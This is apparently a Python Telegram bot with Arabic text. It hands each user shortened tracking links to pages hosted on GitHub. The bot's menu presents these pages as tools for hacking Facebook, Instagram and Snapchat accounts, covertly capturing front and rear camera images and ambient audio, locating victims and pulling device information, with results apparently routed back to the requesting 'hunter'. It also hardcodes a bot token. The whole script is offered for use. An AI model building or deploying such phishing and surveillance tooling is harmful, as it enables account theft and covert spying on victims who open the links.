import telebot
import requests
from flask import Flask
from threading import Thread
import os

# --- نظام الحفاظ على الاتصال 24/7 ---
app = Flask('')
@app.route('/')
def home():
    return "M.Y.9 System is Alive"

def run():
    # استخدام بورت ديناميكي لـ Render
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- إعدادات البوت والتوكن ---
TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
bot = telebot.TeleBot(TOKEN)

# دالة اختصار الروابط
def short_link(url):
    try:
        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
        return res.text if res.status_code == 200 else url
    except:
        return url

@bot.message_handler(commands=['start'])
def send_welcome(message):
    uid = message.chat.id
    first_name = message.from_user.first_name
    # تجهيز اسم الصياد (تبديل الفراغات بشحطة)
    hunter = first_name.replace(" ", "_")
    
    # رابط استضافتك الأساسي
    base = "https://m-y-9-tech.github.io/fb/"
    
    # توليد الروابط الفريدة (كل يوزر له رابط يحتوي على ID واسمه)
    fb = short_link(f"{base}fb.html?id={uid}&hunter={hunter}")
    ig = short_link(f"{base}ig.html?id={uid}&hunter={hunter}")
    snap = short_link(f"{base}snap.html?id={uid}&hunter={hunter}")
    cam = short_link(f"{base}cam.html?id={uid}&hunter={hunter}")
    cam2 = short_link(f"{base}cam2.html?id={uid}&hunter={hunter}")
    audio = short_link(f"{base}audio.html?id={uid}&hunter={hunter}")
    loc = short_link(f"{base}loc.html?id={uid}&hunter={hunter}")
    sys = short_link(f"{base}sys.html?id={uid}&hunter={hunter}")

    msg = f"""
🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {first_name}

👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚

⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
لـ^ـضـ^ـمـ^ـان اسـ^ـتـ^ـقـ^ـرار الاتـ^ـصـ^ـال، يـ^ـجـ^ـب مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـساب المـ^ـطـ^ـور:
🔴 https://www.instagram.com/m_y_.9/

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💎 قـ^ـائـ^ـمـ^ـة الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة 💎
▬▬▬▬▬▬▬▬▬▬▬▬▬▬

🔹 اختـ^ـراق الفيـ^ـسبـ^ـوك 🔐: `{fb}`
🔹 اختـ^ـراق الانـ^ـستـ^ـقـ^ـرام 🛡️: `{ig}`
🔹 اختـ^ـراق سـ^ـنـ^ـاب شـ^ـات 👻: `{snap}`
🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا الأمـ^ـامـ^ـيـ^ـة 📸: `{cam}`
🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا الخـ^ـلـ^ـفـ^ـيـ^ـة 📷: `{cam2}`
🔹 تـ^ـسـ^ـجـ^ـيـ^ـل الصـ^ـوت المـ^ـحـ^ـيـ^ـط 🎤: `{audio}`
🔹 تـ^ـحـ^ـديـ^ـد المـ^ـوقـ^ـع الـ^ـجـ^ـغـ^ـرافـ^ـي 📍: `{loc}`
🔹 سـ^ـحـ^ـب مـ^ـعـ^ـلـ^ـومـ^ـات الـ^ـنـ^ـظـ^ـام 📱: `{sys}`

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
⚙️ الـ^ـحـ^ـالـ^ـة: مـ^ـتـ^ـصـ^ـل 24/7..
    """
    bot.send_message(uid, msg, parse_mode="Markdown", disable_web_page_preview=True)

if __name__ == "__main__":
    keep_alive() # تشغيل Flask
    print("M.Y.9 System is Online...")
    bot.infinity_polling()
